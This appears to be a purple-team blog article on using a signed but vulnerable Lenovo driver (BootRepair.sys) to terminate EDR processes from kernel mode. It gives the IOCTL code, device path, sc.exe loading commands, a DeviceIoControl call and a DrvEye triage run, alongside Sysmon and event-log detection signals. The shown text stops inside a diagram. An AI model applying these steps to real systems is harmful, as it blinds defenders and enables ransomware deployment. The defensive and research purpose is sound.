---
layout: attack
title: "Phantom in the Ring: BYOVD, IOCTL Hunting, and the Art of Killing EDRs from Kernel Space"
date: 2026-06-24
---

<img height="180" align="left" src="/images/edr-phontom-in-the-ring.png">
Modern EDR agents run as Protected Processes backed by tamper-protection flags, kernel callbacks, and watchdog services. For years this defensive stack held firm. Then came **Bring Your Own Vulnerable Driver (BYOVD)**: load a legitimately signed driver from a hardware vendor, invoke a kernel-level process-kill primitive the EDR never expected to watch, and watch the agent terminate. No unsigned code. No DSE bypass. No alert fired.

The diagram below maps the complete attack across four sequential phases: driver triage and IOCTL discovery, kernel-mode loading, exploitation via a crafted `DeviceIoControl` call, and the detection signals each phase leaves behind. Every major section in this article corresponds to one phase in the diagram.

**Related:** [EDR Bypass Roadmap](https://benjitrapp.github.io/attacks/2026-01-18-EDR-bypass-roadmap/) · [ETW-TI Deep Dive](https://benjitrapp.github.io/defenses/2026-06-19-etw-ti/) · [EDR Hook Detection](https://benjitrapp.github.io/attacks/2026-06-19-edr-hook-detection/) · [Unified Ransomware Kill Chain](https://benjitrapp.github.io/cultures/2026-06-24-unified-ransomware-kill-chain/)

<!-- ============================================================
     DIAGRAM 1 — BYOVD Full Attack Flow
     ============================================================ -->
<div style="margin:2rem 0;overflow-x:auto;">
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 900 600" width="100%" style="max-width:900px;display:block;margin:0 auto;font-family:'Courier New',monospace;">
  <defs>
    <linearGradient id="bg1" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stop-color="#0d1117"/><stop offset="100%" stop-color="#161b22"/></linearGradient>
    <marker id="aG" markerWidth="8" markerHeight="6" refX="7" refY="3" orient="auto"><polygon points="0 0,8 3,0 6" fill="#7f8c8d"/></marker>
    <marker id="aR" markerWidth="8" markerHeight="6" refX="7" refY="3" orient="auto"><polygon points="0 0,8 3,0 6" fill="#e74c3c"/></marker>
    <marker id="aGr" markerWidth="8" markerHeight="6" refX="7" refY="3" orient="auto"><polygon points="0 0,8 3,0 6" fill="#27ae60"/></marker>
  </defs>
  <rect width="900" height="600" fill="url(#bg1)" rx="10"/>
  <rect width="900" height="600" fill="none" stroke="#30363d" stroke-width="1.5" rx="10"/>
  <!-- title -->
  <text x="450" y="30" font-size="15" fill="#e6edf3" text-anchor="middle" font-weight="bold">BYOVD — Bring Your Own Vulnerable Driver · Full Attack Flow</text>
  <text x="450" y="48" font-size="10" fill="#8b949e" text-anchor="middle">Ring 0 Process Kill: Driver Triage → IOCTL Decode → DeviceIoControl → EDR Blind</text>
  <line x1="30" y1="55" x2="870" y2="55" stroke="#30363d" stroke-width="1"/>

  <!-- Phase bands -->
  <text x="14" y="130" font-size="8" fill="#566573" transform="rotate(-90,14,130)">① TRIAGE</text>
  <text x="14" y="255" font-size="8" fill="#566573" transform="rotate(-90,14,255)">② LOAD</text>
  <text x="14" y="390" font-size="8" fill="#566573" transform="rotate(-90,14,390)">③ EXPLOIT</text>
  <text x="14" y="520" font-size="8" fill="#566573" transform="rotate(-90,14,520)">④ DETECT</text>

  <!-- Phase 1 -->
  <rect x="28" y="62" width="844" height="115" fill="#0f1923" stroke="#30363d" rx="5"/>
  <text x="44" y="79" font-size="9" fill="#566573">① DRIVER TRIAGE &amp; IOCTL DISCOVERY</text>
  <!-- boxes row -->
  <rect x="36" y="84" width="188" height="83" fill="#1a3a5c" rx="5" stroke="#2471a3"/>
  <text x="130" y="101" font-size="10" fill="#aed6f1" text-anchor="middle" font-weight="bold">LOLDrivers / VulnDB</text>
  <text x="130" y="116" font-size="9" fill="#85c1e9" text-anchor="middle">Known-vuln catalogue</text>
  <text x="130" y="129" font-size="9" fill="#85c1e9" text-anchor="middle">BootRepair.sys · gmer.sys</text>
  <text x="130" y="142" font-size="9" fill="#5dade2" text-anchor="middle">SHA256 · cert · WDAC status</text>
  <text x="130" y="157" font-size="8" fill="#2980b9" text-anchor="middle">loldrivers.io · 2197 tracked</text>
  <line x1="226" y1="126" x2="252" y2="126" stroke="#566573" stroke-width="1.5" marker-end="url(#aG)"/>

  <rect x="254" y="84" width="188" height="83" fill="#3b1f5e" rx="5" stroke="#7d3c98"/>
  <text x="348" y="101" font-size="10" fill="#d7bde2" text-anchor="middle" font-weight="bold">Static RE (IDA / Ghidra)</text>
  <text x="348" y="116" font-size="9" fill="#c39bd3" text-anchor="middle">Import scan → ntoskrnl</text>
  <text x="348" y="129" font-size="9" fill="#c39bd3" text-anchor="middle">ZwTerminateProcess</text>
  <text x="348" y="142" font-size="9" fill="#c39bd3" text-anchor="middle">PsLookupProcessById</text>
  <text x="348" y="157" font-size="8" fill="#7d3c98" text-anchor="middle">ObOpenObjectByPointer</text>
  <line x1="444" y1="126" x2="470" y2="126" stroke="#566573" stroke-width="1.5" marker-end="url(#aG)"/>

  <rect x="472" y="84" width="188" height="83" fill="#5c3000" rx="5" stroke="#e67e22"/>
  <text x="566" y="101" font-size="10" fill="#fad7a0" text-anchor="middle" font-weight="bold">IOCTL Code Recovery</text>
  <text x="566" y="116" font-size="9" fill="#f0b27a" text-anchor="middle">IRP_MJ_DEVICE_CTRL</text>
  <text x="566" y="129" font-size="9" fill="#f0b27a" text-anchor="middle">MajorFunction[14]</text>
  <text x="566" y="142" font-size="9" fill="#f0b27a" text-anchor="middle">Code: 0x222014</text>
  <text x="566" y="157" font-size="8" fill="#e67e22" text-anchor="middle">Input: 4-byte DWORD PID</text>
  <line x1="662" y1="126" x2="688" y2="126" stroke="#566573" stroke-width="1.5" marker-end="url(#aG)"/>

  <rect x="690" y="84" width="174" height="83" fill="#1c2226" rx="5" stroke="#566573"/>
  <text x="777" y="101" font-size="10" fill="#aab7b8" text-anchor="middle" font-weight="bold">Device Path</text>
  <text x="777" y="116" font-size="9" fill="#909ca0" text-anchor="middle">DriverEntry → IoCreateDevice</text>
  <text x="777" y="130" font-size="9" fill="#e67e22" text-anchor="middle">\Device\BootRepair</text>
  <text x="777" y="144" font-size="9" fill="#e67e22" text-anchor="middle">\DosDevices\BootRepair</text>
  <text x="777" y="158" font-size="8" fill="#909ca0" text-anchor="middle">Win32: \\.\BootRepair</text>

  <!-- Phase 2 -->
  <rect x="28" y="190" width="844" height="110" fill="#0f1923" stroke="#30363d" rx="5"/>
  <text x="44" y="207" font-size="9" fill="#566573">② DRIVER LOADING — BYOVD (signed, DSE compliant, Ring 0)</text>
  <!-- down arrows -->
  <line x1="130" y1="168" x2="130" y2="218" stroke="#e74c3c" stroke-width="1.2" stroke-dasharray="3,3" marker-end="url(#aR)"/>
  <line x1="348" y1="168" x2="348" y2="218" stroke="#e74c3c" stroke-width="1.2" stroke-dasharray="3,3" marker-end="url(#aR)"/>
  <line x1="566" y1="168" x2="566" y2="218" stroke="#e74c3c" stroke-width="1.2" stroke-dasharray="3,3" marker-end="url(#aR)"/>
  <line x1="777" y1="168" x2="777" y2="218" stroke="#e74c3c" stroke-width="1.2" stroke-dasharray="3,3" marker-end="url(#aR)"/>

  <rect x="36" y="212" width="230" height="78" fill="#0d2318" rx="5" stroke="#27ae60" stroke-width="1.5"/>
  <text x="151" y="230" font-size="10" fill="#82e0aa" text-anchor="middle" font-weight="bold">✔ Legitimately Signed</text>
  <text x="151" y="246" font-size="9" fill="#76d7a3" text-anchor="middle">BootRepair.sys — LENOVO cert</text>
  <text x="151" y="260" font-size="9" fill="#76d7a3" text-anchor="middle">Symantec SHA256 CA · 0/71 VT</text>
  <text x="151" y="274" font-size="9" fill="#52be80" text-anchor="middle">DSE bypass NOT required</text>
  <text x="151" y="282" font-size="8" fill="#1e8449" text-anchor="middle">HVCI verdict: model-dependent</text>
  <line x1="268" y1="251" x2="294" y2="251" stroke="#566573" stroke-width="1.5" marker-end="url(#aG)"/>

  <rect x="296" y="212" width="220" height="78" fill="#1c2226" rx="5" stroke="#566573"/>
  <text x="406" y="230" font-size="10" fill="#aab7b8" text-anchor="middle" font-weight="bold">Service Registration</text>
  <text x="406" y="246" font-size="9" fill="#7f8c8d" text-anchor="middle">sc.exe create svc type=kernel</text>
  <text x="406" y="260" font-size="9" fill="#7f8c8d" text-anchor="middle">sc.exe start svc</text>
  <text x="406" y="274" font-size="9" fill="#7fb3d3" text-anchor="middle">Requires: Administrator</text>
  <text x="406" y="282" font-size="8" fill="#566573" text-anchor="middle">No Dev Mode / Test Sign needed</text>
  <line x1="518" y1="251" x2="544" y2="251" stroke="#566573" stroke-width="1.5" marker-end="url(#aG)"/>

  <rect x="546" y="212" width="318" height="78" fill="#2c1810" rx="5" stroke="#e74c3c" stroke-width="1.5"/>
  <text x="705" y="230" font-size="10" fill="#f1948a" text-anchor="middle" font-weight="bold">⚠ Executes at Ring 0 — Kernel Mode</text>
  <text x="705" y="246" font-size="9" fill="#e59866" text-anchor="middle">No DACL — any user can open device handle</text>
  <text x="705" y="260" font-size="9" fill="#e59866" text-anchor="middle">IRP_MJ_CREATE: no access check enforced</text>
  <text x="705" y="274" font-size="9" fill="#e59866" text-anchor="middle">IRP_MJ_DEVICE_CONTROL: no caller validation</text>
  <text x="705" y="282" font-size="8" fill="#f1948a" text-anchor="middle">LowPriv user → effective Ring 0 primitive via Admin</text>

  <!-- Phase 3 -->
  <rect x="28" y="313" width="844" height="130" fill="#0f1923" stroke="#30363d" rx="5"/>
  <text x="44" y="330" font-size="9" fill="#566573">③ EXPLOITATION — DeviceIoControl → Kernel Call Chain → PPL Bypass</text>
  <line x1="151" y1="291" x2="151" y2="342" stroke="#e74c3c" stroke-width="1.2" stroke-dasharray="3,3" marker-end="url(#aR)"/>
  <line x1="406" y1="291" x2="406" y2="342" stroke="#e74c3c" stroke-width="1.2" stroke-dasharray="3,3" marker-end="url(#aR)"/>
  <line x1="700" y1="291" x2="700" y2="342" stroke="#e74c3c" stroke-width="1.2" stroke-dasharray="3,3" marker-end="url(#aR)"/>

  <rect x="36" y="336" width="200" height="97" fill="#1a2f3f" rx="5" stroke="#2471a3"/>
  <text x="136" y="354" font-size="10" fill="#aed6f1" text-anchor="middle" font-weight="bold">User-Mode App</text>
  <text x="136" y="370" font-size="9" fill="#85c1e9" text-anchor="middle">CreateFile("\\.\BootRepair")</text>
  <text x="136" y="384" font-size="9" fill="#85c1e9" text-anchor="middle">→ hDevice</text>
  <text x="136" y="398" font-size="9" fill="#85c1e9" text-anchor="middle">DeviceIoControl(</text>
  <text x="136" y="412" font-size="9" fill="#85c1e9" text-anchor="middle">  hDevice, 0x222014,</text>
  <text x="136" y="424" font-size="9" fill="#f0b27a" text-anchor="middle">  &amp;pid, 4, NULL, 0)</text>

  <line x1="238" y1="384" x2="268" y2="384" stroke="#e74c3c" stroke-width="2" marker-end="url(#aR)"/>
  <text x="253" y="378" font-size="8" fill="#e74c3c" text-anchor="middle">IRP</text>

  <rect x="270" y="336" width="230" height="97" fill="#2a1040" rx="5" stroke="#7d3c98"/>
  <text x="385" y="354" font-size="10" fill="#d7bde2" text-anchor="middle" font-weight="bold">Kernel Dispatch</text>
  <text x="385" y="370" font-size="9" fill="#c39bd3" text-anchor="middle">MajorFunction[14] invoked</text>
  <text x="385" y="384" font-size="9" fill="#c39bd3" text-anchor="middle">PsLookupProcessByProcessId</text>
  <text x="385" y="398" font-size="9" fill="#c39bd3" text-anchor="middle">→ PEPROCESS *</text>
  <text x="385" y="412" font-size="9" fill="#c39bd3" text-anchor="middle">ObOpenObjectByPointer</text>
  <text x="385" y="424" font-size="9" fill="#c39bd3" text-anchor="middle">→ hProcess (full access)</text>

  <line x1="502" y1="384" x2="530" y2="384" stroke="#e74c3c" stroke-width="2" marker-end="url(#aR)"/>

  <rect x="532" y="336" width="220" height="97" fill="#2c1810" rx="5" stroke="#e74c3c" stroke-width="2"/>
  <text x="642" y="354" font-size="10" fill="#f1948a" text-anchor="middle" font-weight="bold">ZwTerminateProcess</text>
  <text x="642" y="370" font-size="9" fill="#e59866" text-anchor="middle">No access-level check</text>
  <text x="642" y="384" font-size="9" fill="#e59866" text-anchor="middle">No PPL protection check</text>
  <text x="642" y="398" font-size="9" fill="#e59866" text-anchor="middle">Bypasses tamper-protection</text>
  <text x="642" y="412" font-size="9" fill="#f1948a" text-anchor="middle" font-weight="bold">→ EDR/AV process KILLED</text>
  <text x="642" y="424" font-size="9" fill="#f1948a" text-anchor="middle">Works on PPL processes</text>

  <line x1="754" y1="384" x2="780" y2="384" stroke="#e74c3c" stroke-width="2" marker-end="url(#aR)"/>
  <rect x="782" y="336" width="82" height="97" fill="#2c1810" rx="5" stroke="#c0392b"/>
  <text x="823" y="356" font-size="9" fill="#f1948a" text-anchor="middle" font-weight="bold">IMPACT</text>
  <text x="823" y="372" font-size="8" fill="#e59866" text-anchor="middle">EDR blind 🦝</text>
  <text x="823" y="386" font-size="8" fill="#e59866" text-anchor="middle">AV killed</text>
  <text x="823" y="400" font-size="8" fill="#e59866" text-anchor="middle">PPL bypass</text>
  <text x="823" y="414" font-size="8" fill="#e59866" text-anchor="middle">Payload</text>
  <text x="823" y="428" font-size="8" fill="#e59866" text-anchor="middle">deploy</text>

  <!-- Phase 4 -->
  <rect x="28" y="456" width="844" height="106" fill="#0d1f17" stroke="#27ae60" rx="5"/>
  <text x="44" y="473" font-size="9" fill="#52be80">④ DETECTION &amp; HUNTING SIGNALS</text>
  <line x1="136" y1="444" x2="136" y2="480" stroke="#27ae60" stroke-width="1.2" stroke-dasharray="3,3" marker-end="url(#aGr)"/>
  <line x1="406" y1="444" x2="406" y2="480" stroke="#27ae60" stroke-width="1.2" stroke-dasharray="3,3" marker-end="url(#aGr)"/>
  <line x1="700" y1="444" x2="700" y2="480" stroke="#27ae60" stroke-width="1.2" stroke-dasharray="3,3" marker-end="url(#aGr)"/>

  <rect x="36" y="477" width="218" height="76" fill="#0d2318" rx="4" stroke="#1e8449"/>
  <text x="145" y="493" font-size="9" fill="#82e0aa" text-anchor="middle" font-weight="bold">Sysmon / ETW</text>
  <text x="145" y="507" font-size="8" fill="#76d7a3" text-anchor="middle">Event ID 6: Driver loaded</text>
  <text x="145" y="520" font-size="8" fill="#76d7a3" text-anchor="middle">Hash → LOLDrivers lookup</text>
  <text x="145" y="533" font-size="8" fill="#52be80" text-anchor="middle">sc.exe type=kernel (EID 7045)</text>

  <rect x="272" y="477" width="258" height="76" fill="#0d2318" rx="4" stroke="#1e8449"/>
  <text x="401" y="493" font-size="9" fill="#82e0aa" text-anchor="middle" font-weight="bold">Process Termination Anomalies</text>
  <text x="401" y="507" font-size="8" fill="#76d7a3" text-anchor="middle">EDR process missing (no crash)</text>
  <text x="401" y="520" font-size="8" fill="#76d7a3" text-anchor="middle">CreateFile → \\.\BootRepair</text>
  <text x="401" y="533" font-size="8" fill="#52be80" text-anchor="middle">DeviceIoControl to unknown device</text>

  <rect x="548" y="477" width="218" height="76" fill="#0d2318" rx="4" stroke="#1e8449"/>
  <text x="657" y="493" font-size="9" fill="#82e0aa" text-anchor="middle" font-weight="bold">MITRE ATT&amp;CK</text>
  <text x="657" y="507" font-size="8" fill="#76d7a3" text-anchor="middle">T1068 · T1562.001 · T1014</text>
  <text x="657" y="520" font-size="8" fill="#76d7a3" text-anchor="middle">T1543.003 · T1553.002</text>
  <text x="657" y="533" font-size="8" fill="#52be80" text-anchor="middle">DrvEye --loldrivers --live-check</text>

  <text x="450" y="570" font-size="8" fill="#2d3436" text-anchor="middle">benjitrapp.github.io · BYOVD Deep Dive · Purple Team Edition 🦝</text>
</svg>
</div>

### BYOVD Attack Flow: Diagram Walkthrough

The four phase bands in the diagram read left-to-right within each band, connected by dashed arrows flowing downward to the next phase. Together they form a single unbroken chain from driver discovery to EDR termination.

**Phase 1: Driver Triage and IOCTL Discovery**

Three parallel workstreams identify a viable weapon. A catalogue check against [LOLDrivers](https://www.loldrivers.io/) filters a multiple thousands of entries pool for known-vulnerable drivers and returns SHA-256, certificate chain, and WDAC block-list status upfront. Static reverse engineering in IDA or Ghidra targets the import table: the combined presence of `ZwTerminateProcess`, `PsLookupProcessByProcessId`, and `ObOpenObjectByPointer` signals a workable process-kill chain. The `IRP_MJ_DEVICE_CONTROL` handler stored at `MajorFunction[14]` is then inspected for the IOCTL constant. For `BootRepair.sys` that constant is `0x222014`, with a 4-byte DWORD PID as the sole input. The device path (`\Device\BootRepair`, Win32 alias `\\.\BootRepair`) is recovered from `DriverEntry` string references.

**Phase 2: Kernel-Mode Loading**

The selected driver is dropped to a writable path and registered as a kernel service with two `sc.exe` commands. No Developer Mode, no Test Signing mode, no custom bootloader. The driver carries a valid code-signing certificate (LENOVO, issued via Symantec) that satisfies Driver Signature Enforcement. It loads with 0/71 VirusTotal detections at discovery time.

The critical structural flaw surfaces at load time: `IoCreateDevice` was called with a `NULL` SecurityDescriptor. No DACL was attached to the device object. `IRP_MJ_CREATE` enforces no access check and `IRP_MJ_DEVICE_CONTROL` performs no caller validation. Any administrative-level process can open a handle and send IOCTLs without restriction.

**Phase 3: Exploitation and EDR Termination**

A single `DeviceIoControl` call carrying the target PID travels from user-mode into the kernel as an IRP (I/O Request Packet). The dispatch chain executes five steps:

1. The I/O manager routes the IRP to `MajorFunction[14]`, the device-control handler.
2. The handler matches control code `0x222014` and reads the PID from `AssociatedIrp.SystemBuffer`.
3. `PsLookupProcessByProcessId` resolves the integer PID to a kernel `EPROCESS` pointer.
4. `ObOpenObjectByPointer` constructs a full-access kernel handle to the target. This call runs at Ring 0, where the PPL access restriction enforced by user-mode `OpenProcess` does not exist.
5. `ZwTerminateProcess` terminates the process. The EDR agent exits. Tamper-protection flags, watchdog services, and kernel callback registrations are now irrelevant: the process hosting them is gone.

**Phase 4: Detection and Hunting Signals**

Three durable forensic signals fire before the EDR is terminated and represent the blue team's only reliable window:

- **Sysmon Event ID 6** fires at driver load time and captures the SHA-256 hash. Matching this hash against the LOLDrivers feed at ingest is the highest-fidelity detection in the chain.
- **Windows Event 7045** records the `sc.exe` kernel service creation with `ServiceType=1`.
- A `CreateFile` call to `\\.\BootRepair` followed by `DeviceIoControl` from a non-hardware-management process is anomalous by definition.

The operational constraint: all three signals fire before EDR termination, but only if the SIEM pipeline ingests them in near-real-time. A 5-minute ingest delay means the EID 6 alert arrives after the EDR is already dead.

---

- [Why BYOVD Still Works](#why-byovd-still-works)
- [The Threat Landscape: Known-Vulnerable Drivers in the Wild](#the-threat-landscape)
- [Phase 1: Driver Triage](#phase-1-driver-triage)
  - [Static Import Scanning](#static-import-scanning)
  - [DrvEye: Automated Driver Triage at Scale](#drveye-automated-driver-triage-at-scale)
- [Phase 2: IOCTL Anatomy](#phase-2-ioctl-anatomy)
  - [The CTL_CODE Macro](#the-ctl_code-macro)
  - [Reversing IOCTLs in IDA Pro](#reversing-ioctls-in-ida-pro)
  - [Reversing IOCTLs in Ghidra](#reversing-ioctls-in-ghidra)
  - [Device Path Recovery](#device-path-recovery)
  - [Dynamic Analysis: Intercepting IOCTLs with Frida](#dynamic-analysis-intercepting-ioctls-with-frida)
  - [Sending IOCTLs from Python](#sending-ioctls-from-python)
- [Phase 3: Exploitation](#phase-3-exploitation)
  - [Case Study: PhantomKiller](#case-study-phantomkiller)
  - [The Full Kernel Call Chain](#the-full-kernel-call-chain)
  - [NimBlackout: A Nim Adaptation of the Same Primitive](#nimblackout)
- [MITRE ATT&CK Mapping](#mitre-attck-mapping)
- [Detection Engineering and Hunting Playbook](#detection-engineering-and-hunting-playbook)
  - [Signal 1: Driver Load Events](#signal-1-driver-load-events)
  - [Signal 2: Service Creation of Kernel Drivers](#signal-2-service-creation-of-kernel-drivers)
  - [Signal 3: DeviceIoControl to Unknown Devices](#signal-3-deviceiocontrol-to-unknown-devices)
  - [Signal 4: Protected Process Termination Anomalies](#signal-4-protected-process-termination-anomalies)
  - [Signal 5: LOLDrivers Hash Matching at Ingest](#signal-5-loldrivers-hash-matching-at-ingest)
  - [Splunk Detection Rules](#splunk-detection-rules)
- [Defensive Architecture: HVCI Deep Dive](#defensive-architecture-hvci-deep-dive)
  - [What HVCI Actually Enforces](#what-hvci-actually-enforces)
  - [The HVCI Block List Gap: Where BYOVD Still Lives](#the-hvci-block-list-gap-where-byovd-still-lives)
  - [Hunting for a Working BYOVD Candidate](#hunting-for-a-working-byovd-candidate)
  - [BYOVD Watchdog: Live HVCI Gap Intelligence](#byovd-watchdog-live-hvci-gap-intelligence)
  - [HVCI Extraction from a Target Environment](#hvci-extraction-from-a-target-environment-red-team-context)
  - [Scoring a Candidate: The Five-Point Checklist](#scoring-a-candidate-the-five-point-checklist)
  - [WDAC and LOLDrivers-Based Prevention](#wdac-and-loldrivers-based-prevention)
- [DSE: The Gatekeeper and Its Bypass](#dse-the-gatekeeper-and-its-bypass)
  - [DSE Internals: g\_cioptions and CI.dll](#dse-internals-g_cioptions-and-cidll)
  - [The Dsebler Technique: KsecDD.sys as a Write Gadget](#the-dsebler-technique-ksecddyss-as-a-write-gadget)
  - [BYOVD vs. DSE Bypass: Two Paths to Ring 0](#byovd-vs-dse-bypass-two-paths-to-ring-0)
- [BYOVD in Ransomware Operations](#byovd-in-ransomware-operations)
- [References and Open-Source Research](#references-and-open-source-research)

---

## Why BYOVD Still Works

The constraint Windows imposes on kernel-mode code is binary: a driver must be signed by a certificate chaining to a trusted root before DSE allows it to load. This was a meaningful control when kernel-mode exploits required fresh unsigned code. BYOVD sidesteps the constraint entirely; it does not exploit DSE, it complies with it.

The attack model is straightforward:

1. Find a driver that is legitimately signed by a reputable vendor.
2. Identify that the driver exposes a dangerous kernel-level primitive (process termination, arbitrary read/write, physical memory access) with no caller validation.
3. Load the driver on the target system (requires administrative privileges, but not Developer Mode or Test Mode).
4. Invoke the primitive via a crafted `DeviceIoControl` call.

The result: after passing the admin boundary, an attacker can terminate PPL-protected processes (including EDR agents with tamper-protection) without ever loading a single unsigned byte of code.

Three factors keep BYOVD alive as an operational technique:

**The long tail of signed drivers.** Hardware vendors compiled and signed millions of drivers over decades. Many were written before the security community understood how dangerous unrestricted kernel primitives exposed to user-mode were. Once signed, those drivers persist indefinitely in vendor update packages, recovery tools, and pre-installed software suites.

**Revocation lag.** Certificate revocation and WDAC block-list updates are reactive, not proactive. A driver discovered by a researcher today may remain loadable on unpatched systems for months or years.

**HVCI is not universal.** Hypervisor-Protected Code Integrity (HVCI / Memory Integrity) renders most BYOVD drivers unloadable, but it requires compatible hardware and is not enabled by default on all Windows configurations. Enterprise adoption remains incomplete. Even with HVCI enabled, 479 known-vulnerable drivers still load as of mid-2026.

---

## The Threat Landscape: Known-Vulnerable Drivers in the Wild

BYOVD is no longer a theoretical technique. Ransomware operators and nation-state actors have integrated it into mainstream kill chains:

| Threat Actor / Malware | Vulnerable Driver Used | Technique | Source |
|---|---|---|---|
| BlackCat / ALPHV | [`ktgn.sys`](https://www.loldrivers.io/) (anti-cheat driver) | EDR termination before encryption | [Trend Micro (2023)](https://www.trendmicro.com/en_us/research/23/h/blackcat-ransomware-deploys-new-signed-kernel-driver.html) |
| [Lazarus Group](https://attack.mitre.org/groups/G0032/) | [`dell_bios.sys`](https://www.loldrivers.io/) (Dell BIOS update) | Arbitrary kernel write → DSE disable | [ESET (2022)](https://www.welivesecurity.com/2022/01/11/signed-kernel-drivers-unguarded-gateway-windows-core/) |
| RobbinHood ransomware | [`gdrv.sys`](https://www.loldrivers.io/) (Gigabyte utility) | EDR termination → unrestricted deployment | [Sophos (2019)](https://news.sophos.com/en-us/2019/04/09/robinhood-ransomware-takes-a-different-approach/) |
| [Scattered Spider](https://attack.mitre.org/groups/G1015/) | [`truesight.sys`](https://www.loldrivers.io/) (RealTek) | AV kill before SIM-swap pivot | [CrowdStrike (2023)](https://www.crowdstrike.com/blog/scattered-spider-attempts-to-avoid-detection-with-bring-your-own-vulnerable-driver-tactic/) |
| Cuba ransomware | [`ApcHelper.sys`](https://www.loldrivers.io/) (leaked MSI driver) | Callback removal → payload delivery | [Kaspersky (2022)](https://securelist.com/cuba-ransomware/110533/) |
| [PhantomKiller (PoC 2026)](https://github.com/redteamfortress/PhantomKiller) | [`BootRepair.sys`](https://www.loldrivers.io/) (Lenovo PC Manager) | Zero-DACL device → PID-targeted kill | [GitHub PoC](https://github.com/redteamfortress/PhantomKiller) |

The pattern is consistent: Phase 4 (Defense Evasion) of the ransomware kill chain maps directly to BYOVD. An operator who can terminate the EDR agent before deploying the encryption payload gains minutes of unobserved execution time, typically all that is needed.

---

## Phase 1: Driver Triage

Before a driver can be weaponised, it must be identified. The triage question is: does this driver expose a user-reachable kernel primitive with insufficient caller validation?

### Static Import Scanning

The fastest first-pass filter is the driver's import table. A driver that imports `ZwTerminateProcess`, `MmMapIoSpace`, `ZwWriteVirtualMemory`, or similar functions is a candidate for closer examination. These are the kernel functions that give BYOVD its power, and their presence in a signed driver is a red flag.

| Import                       | Exploit primitive                                  |
|------------------------------|----------------------------------------------------|
| `ZwTerminateProcess`         | Kill any process including PPL                     |
| `MmMapIoSpace`               | Map physical memory → arbitrary kernel R/W         |
| `ZwWriteVirtualMemory`       | Cross-process memory write                         |
| `PsLookupProcessByProcessId` | Resolve EPROCESS from PID (prerequisite for above) |
| `ObOpenObjectByPointer`      | Obtain handle from kernel object pointer           |
| `ZwSetSystemInformation`     | Driver blacklist / callback manipulation           |
| `MmCopyMemory`               | Arbitrary physical read                            |

### DrvEye: Automated Driver Triage at Scale

Manual analysis does not scale. [DrvEye](https://github.com/0xDbgMan/DrvEye) by 0xDbgMan automates the entire triage pipeline:

```bash
pip install pefile capstone cryptography unicorn yara-python

python3 DrvEye.py BootRepair.sys \
    --live-check \
    --loldrivers \
    --json report.json \
    --ida BootRepair_annotations.py \
    --save-pocs \
    --verbose
```

DrvEye's load verdict matrix:

```
─── LOAD VERDICT ───
  Default Win10/11         : WILL LOAD
  Secure Boot + DSE        : WILL LOAD
  HVCI / Memory Integrity  : WILL NOT LOAD
      • FORCE_INTEGRITY flag not set
      • W+X section present
  Test-signing mode        : WILL LOAD
  S Mode                   : WILL NOT LOAD
```

DrvEye's IOCTL surface output:

```
[*] Detected IOCTL codes:
    0x222014  @0x14000198C  (BUFFERED, FILE_ANY_ACCESS)
              → process-kill
              [!!PPL BYPASS] [UNGATED-sink]
              bugs=process-kill,missing-probe
```

With `--save-pocs`, DrvEye emits a compilable C `DeviceIoControl` skeleton per IOCTL. With `--loldrivers`, it pulls current feeds from LOLDrivers, MalwareBazaar, and Hybrid Analysis. With `--ida`, it generates an IDA Python annotation script you can execute directly in the disassembler.

---

## Phase 2: IOCTL Anatomy

When a Windows driver calls `IoCreateDevice` during `DriverEntry`, it exposes a named device object that user-mode processes can open with `CreateFile("\\.\DeviceName")`. Any caller holding a valid handle can then send commands by calling `DeviceIoControl`, passing a 32-bit control code called an **IOCTL** together with optional input and output buffers. The kernel wraps this call into an **IRP** (I/O Request Packet) and routes it to the driver's `IRP_MJ_DEVICE_CONTROL` handler, registered at `MajorFunction[14]` in the driver object.

Every IOCTL packs four fields into a single 32-bit integer: the device type, a caller access level, a vendor-assigned function number, and a buffer transfer method. The access field is the security gate: `FILE_ANY_ACCESS` (value `0`) disables that gate entirely, meaning the kernel performs no privilege check before dispatching the request. This single missing check is the architectural flaw that makes `BootRepair.sys` exploitable from any administrative process.

<!-- ============================================================
     DIAGRAM 2 — IOCTL Bit-Field Anatomy
     ============================================================ -->
<div style="margin:2rem 0;overflow-x:auto;">
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 860 320" width="100%" style="max-width:860px;display:block;margin:0 auto;font-family:'Courier New',monospace;">
  <rect width="860" height="320" fill="#0d1117" rx="10"/>
  <rect width="860" height="320" fill="none" stroke="#30363d" stroke-width="1.5" rx="10"/>
  <text x="430" y="28" font-size="14" fill="#e6edf3" text-anchor="middle" font-weight="bold">IOCTL Code Anatomy — CTL_CODE Macro Decoded</text>
  <text x="430" y="46" font-size="10" fill="#8b949e" text-anchor="middle">32-bit control code passed to DeviceIoControl() — example: 0x222014 (BootRepair.sys)</text>

  <!-- bit ruler -->
  <rect x="40" y="58" width="390" height="42" fill="#1a2980" rx="3" stroke="#2980b9"/>
  <text x="235" y="75" font-size="11" fill="#aed6f1" text-anchor="middle" font-weight="bold">DeviceType</text>
  <text x="235" y="91" font-size="10" fill="#85c1e9" text-anchor="middle">bits 31:16 — 16 bits — 0x0022 = FILE_DEVICE_UNKNOWN</text>

  <rect x="430" y="58" width="50" height="42" fill="#6c3483" rx="3" stroke="#7d3c98"/>
  <text x="455" y="75" font-size="9" fill="#d7bde2" text-anchor="middle" font-weight="bold">Access</text>
  <text x="455" y="91" font-size="8" fill="#c39bd3" text-anchor="middle">15:14 · 0x0</text>

  <rect x="480" y="58" width="25" height="42" fill="#154360" rx="3" stroke="#1a5276"/>
  <text x="492" y="75" font-size="8" fill="#85c1e9" text-anchor="middle">Cust</text>
  <text x="492" y="91" font-size="7" fill="#85c1e9" text-anchor="middle">bit 13</text>

  <rect x="505" y="58" width="268" height="42" fill="#1e5631" rx="3" stroke="#27ae60"/>
  <text x="639" y="75" font-size="11" fill="#82e0aa" text-anchor="middle" font-weight="bold">Function Code</text>
  <text x="639" y="91" font-size="10" fill="#76d7a3" text-anchor="middle">bits 12:2 — 11 bits — 0x805 (vendor-defined)</text>

  <rect x="773" y="58" width="49" height="42" fill="#7b241c" rx="3" stroke="#e74c3c"/>
  <text x="797" y="75" font-size="9" fill="#f1948a" text-anchor="middle" font-weight="bold">Method</text>
  <text x="797" y="91" font-size="8" fill="#f1948a" text-anchor="middle">1:0 · 0x0</text>

  <!-- bit labels -->
  <text x="42" y="55" font-size="8" fill="#566573">31</text>
  <text x="416" y="55" font-size="8" fill="#566573">16</text>
  <text x="431" y="55" font-size="8" fill="#566573">15</text>
  <text x="474" y="55" font-size="8" fill="#566573">14</text>
